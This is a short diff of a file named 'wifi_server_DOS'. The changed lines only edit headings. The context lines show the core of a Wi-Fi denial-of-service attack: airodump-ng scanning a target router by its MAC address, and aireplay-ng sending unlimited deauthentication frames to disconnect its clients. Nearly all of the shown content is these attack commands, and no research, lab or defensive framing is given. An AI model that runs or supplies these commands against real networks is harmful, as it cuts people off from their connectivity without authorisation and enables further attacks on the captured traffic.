@@ -1,4 +1,4 @@
-# wifi_server_DOS
+
 sudo -s
 
 
@@ -23,5 +23,5 @@ airodump-ng -c 6 -w SCAN_test1 --bssid <mac_address_of_router> wlo1
 aireplay-ng -0 0 -a <mac_address_of_router> wlo1
 
 
-# wifi_server_DOS
+
 # wifi_server_DOS
